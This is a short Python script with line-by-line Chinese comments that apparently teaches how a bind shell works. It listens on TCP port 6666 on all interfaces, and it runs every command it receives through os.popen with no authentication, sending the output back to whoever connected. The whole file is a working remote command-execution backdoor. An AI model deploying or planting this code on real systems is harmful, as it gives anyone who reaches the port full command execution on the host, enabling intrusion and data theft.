#coding: utf-8
from socket import *
from os import *


if __name__ == "__main__":
	# 第一个参数是"服务器之间网络通信", 第二个参数是"流式socket , for TCP"
	s = socket(AF_INET, SOCK_STREAM)
	# 将套接字绑定到地址，第一个参数是绑定本机，地二个参数是端口号6666
	s.bind(('', 6666))
	# 开始监听传入连接，参数里面的数字表示最大连接数量
	s.listen(1)
	# 设置一个循环
	while True:
		# 接受连接并返回（conn,address）,其中conn是新的套接字对象，可以用来接收和发送数据。address是连接客户端的地址。
		sock, addr = s.accept()
		# 打印
		print('Connect by ', addr)
		# 循环
		while True:
			# 接受信息
			cmd = sock.recv(1024)
			# 判断是否为exit
			if cmd == 'exit':
				# 断开连接
				sock.close()
				# 跳出循环
				break
			# 执行上面接收到的cmd命令
			result = popen(cmd).read()
			# 发送执行cmd命令的结果
			sock.send(result)
